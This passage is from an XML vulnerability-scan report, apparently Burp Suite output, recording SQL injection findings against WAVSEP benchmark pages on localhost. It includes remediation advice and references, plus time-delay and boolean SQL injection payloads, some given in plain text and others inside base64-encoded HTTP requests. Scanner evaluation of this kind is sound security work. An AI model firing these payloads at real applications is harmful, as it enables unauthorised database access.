      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjE4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNDENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpObyBNYXRjaC4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTAzLUluamVjdGlvbkluQ2FsYy1TdHJpbmctQm9vbGVhbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3A/dXNlcm5hbWU9dGV4dHZhbHVlJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYicgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBWYWxpZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjE5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIHVzZXJzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7166988734428631040</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp [orderby parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>orderby</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>,(select*from(select(sleep(20)))a)</b> was submitted in the orderby parameter. The application took <b>20004</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcD9vcmRlcmJ5PW1zZ2lkJTJjKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjU0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MzYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDUgLSBJbmplY3Rpb24gaW50byBhbiBvcmRlciBieSBjbGF1c2UgKGFueSB0eXBlKSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEKPC9URD4KPFREPgpXZWxjb21lIHRvIHRoZSB3ZWIgc2l0ZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyCjwvVEQ+CjxURD4KUmVtZW1iZXIgdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CllvdXIgYWNjb3VudCBpcyBhYm91dCB0byBleHBpcmUKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1684825644874180608</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case06-InjectionInView-Numeric-PermissionBypass-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case06-InjectionInView-Numeric-PermissionBypass-WithDifferent200Responses.jsp [transactionId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionId</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>82783241 or 6642=06642</b> and <b>60803596 or 4209=4218</b> were each submitted in the transactionId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionId parameter. The application took <b>20005</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTA2LUluamVjdGlvbkluVmlldy1OdW1lcmljLVBlcm1pc3Npb25CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3A/dHJhbnNhY3Rpb25JZD0xMzI4Mjc4MzI0MSUyMG9yJTIwNjY0MiUzZDA2NjQyIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2MTcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiB0cmFuc2FjdGlvbnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8VFI+CjxURD4KMTMyCjwvVEQ+CjxURD4KMTAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTA2LUluamVjdGlvbkluVmlldy1OdW1lcmljLVBlcm1pc3Npb25CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3A/dHJhbnNhY3Rpb25JZD0xMzI2MDgwMzU5NiUyMG9yJTIwNDIwOSUzZDQyMTggSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBWYWxpZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MjMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiB0cmFuc2FjdGlvbnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTA2LUluamVjdGlvbkluVmlldy1OdW1lcmljLVBlcm1pc3Npb25CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3A/dHJhbnNhY3Rpb25JZD0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBWYWxpZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjU0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MjMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiB0cmFuc2FjdGlvbnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4090729345317645312</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
